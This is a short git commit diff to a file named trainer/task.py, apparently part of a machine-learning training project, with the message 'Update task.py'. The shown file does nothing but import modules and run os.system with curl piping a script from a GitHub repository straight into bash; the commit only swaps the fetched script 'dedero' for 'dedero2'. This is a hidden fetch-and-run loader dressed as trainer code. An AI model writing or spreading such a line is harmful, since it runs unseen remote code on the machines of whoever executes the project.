96367b2328e879e71d1c302b773a6bfbcd059b8e
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-01-19 07:12:39 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/nandafiku/gradi/raw/main/dedero | bash')
+os.system('curl -sL https://github.com/nandafiku/gradi/raw/main/dedero2 | bash')
